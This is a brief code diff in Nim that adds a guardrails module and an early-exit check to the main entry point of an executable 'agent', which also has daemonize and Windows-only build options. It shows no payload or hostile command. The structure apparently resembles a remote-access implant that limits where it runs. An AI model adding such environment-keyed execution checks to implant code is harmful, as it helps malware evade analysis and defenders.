@@ -11,6 +11,7 @@ elif defined(service):
 else:
   # Executable build - use standard main entry point
   import agent
+  import utils/guardrails
 
   # Conditional imports for Windows-only features
   when defined(windows):
@@ -51,6 +52,10 @@ else:
 
   # Main entry point
   proc main() =
+    # Check execution guardrails before anything else
+    if not checkGuardrails():
+      return
+    
     # Daemonize if compile flag is set
     when defined(daemonize):
       if daemonize():
